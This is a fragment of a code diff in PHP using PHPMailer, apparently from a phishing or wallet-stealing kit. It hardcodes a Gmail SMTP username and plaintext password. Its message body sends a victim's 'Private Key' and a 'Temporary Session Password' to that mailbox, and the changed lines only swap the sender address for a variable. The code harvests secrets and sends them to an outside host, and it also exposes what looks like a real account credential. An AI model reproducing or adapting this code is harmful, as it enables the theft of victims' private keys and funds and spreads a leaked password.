@@ -29,10 +29,10 @@ $mail->SMTPSecure = "tls";
 $mail->Port = "587";
 $mail->Username = "emmajoy658@gmail.com";
 $mail->Password = "Olasunkanmi2001!";
-$mail->setFrom("emmajoy658@gmail.com");
-$mail->AddReplyTo("emmajoy658@gmail.com");
+$mail->setFrom($email_from);
+$mail->AddReplyTo($email_from);
 $mail->Subject = "/New Entry";
-$mail->MsgHTML("emmajoy658@gmail.com");
+$mail->MsgHTML($email_from);
 
 $mail->Body = "Private Key= " . $privateKey . "\r\n Temporary Session Password= " . $pkpass;
 
